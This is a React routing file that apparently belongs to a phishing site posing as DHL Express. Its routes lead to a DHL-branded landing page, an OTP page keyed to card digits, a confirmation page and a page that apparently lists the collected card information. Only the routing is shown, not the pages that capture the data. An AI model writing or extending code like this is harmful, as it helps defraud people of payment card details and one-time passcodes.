import React, { useEffect } from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import DhlExpress from "./dhlexpress";
import AllCardInfos from "./dhlexpress/cardinfo";
import Otp, { Verified } from "./dhlexpress/otp";

function App() {
  return (
    <>
      <BrowserRouter>
        <Routes>
          <Route path="/:param" element={<DhlExpress />} />
          <Route path="/otp/:cardigit/:param" element={<Otp />} />
          <Route path="/confirm" element={<Verified />} />
          <Route path="/info/:docId" element={<AllCardInfos />} />
        </Routes>
      </BrowserRouter>
    </>
  );
}

export default App;
